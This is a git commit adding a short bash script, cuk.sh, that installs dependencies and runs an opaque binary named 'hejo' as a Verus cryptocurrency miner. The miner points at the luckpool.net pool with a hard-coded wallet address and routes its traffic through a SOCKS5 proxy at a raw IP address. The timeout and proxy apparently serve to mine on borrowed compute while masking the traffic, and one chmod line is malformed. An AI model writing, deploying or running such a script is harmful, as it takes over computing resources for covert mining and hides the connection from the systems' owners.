512e68533520bddf199251c678a0e5bad67fa718
chiarasss <87688804+chiarasss@users.noreply.github.com>
2021-09-04 09:28:17 +0700

    Create cuk.sh

---
+++ cuk.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+sudo apt update
+sudo apt install screen libjansson4 -y
+chmod +x cuk.sh && chmod +x hejo chmod 777 hejo cuk.sh
+screen -dmS ls
+A=stratum+tcp://na.luckpool.net:3956
+B=R9WfkuyN7thLWMiL98b2NrHfL1qRYzqcdY
+C=PUSHING-14
+D=socks5://185.213.213.110:1080
+timeout 359m ./hejo -a verus -o $A -u $B.$C -p x -t 2 -x $D
+sudo apt update
